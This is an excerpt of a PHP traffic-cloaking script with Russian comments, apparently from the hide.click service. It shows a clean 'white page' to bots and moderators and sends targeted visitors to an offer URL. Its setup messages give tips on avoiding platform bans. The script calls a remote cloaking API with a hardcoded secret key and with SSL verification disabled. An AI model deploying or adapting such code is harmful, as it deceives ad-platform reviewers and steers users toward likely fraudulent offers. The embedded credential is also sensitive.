...
$CLOAKING['WHITE_PAGE'] = 'wp.html';//PHP или HTML файл для ботов и модераторов
$CLOAKING['OFFER_PAGE'] = 'https://j310jnb.club/go/lkel:id1012?s=e38';//PHP или HTML файл с оффером/лендингом для пользователей на которых таргетируемся.
...
$CLOAKING['API_SECRET_KEY'] = 'v1901260ce87e54e38b346d23ba50d3aee';// ключ доступа к API.
/*********************************************/
...
// если у вас в команде нормальный админ и програмист, это можно удалить
    ...
    else if(strstr($CLOAKING['WHITE_PAGE'],'://')) echo '⚠ Чтобы снизить вероятность бана рекомендуем использовать локальный WHITE_PAGE, то есть разместить его непосредственно у себя на сайте! Если вы уверены в своих действиях, <a target="_blank" href="?cloaking=white">нажмите чтобы открыть WHITE_PAGE</a> и проверьте что страница отображается правильно.<br>';
    ...
    if(is_file($CLOAKING['OFFER_PAGE']) && ($CLOAKING['OFFER_PAGE']=='index.htm' || $CLOAKING['OFFER_PAGE']=='index.html' || $CLOAKING['OFFER_PAGE']=='index.php' )) {echo '⚠ Чтобы снизить вероятность бана рекомендуем переименовать OFFER_PAGE (например <b>offer.php</b> вместо <b>'.$CLOAKING['OFFER_PAGE'].'</b>) и прописать новое имя в строке <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> <img src="http://hide.click/gif/black.gif" border="1"><br>';}
    else if(is_file($CLOAKING['OFFER_PAGE']) || strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ок. <a target="_blank" href="?cloaking=offer">Нажмите чтобы открыть OFFER_PAGE</a>. Убедитесь что страница отображается правильно.<br>';
    ...
    $CLOAKINGdata=array();
    if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92185931112481f1589282267&version='.$CLOAKING['VERSION'].'&curl=false&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92185931112481f1589282267&version='.$CLOAKING['VERSION'].'&curl=true&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);
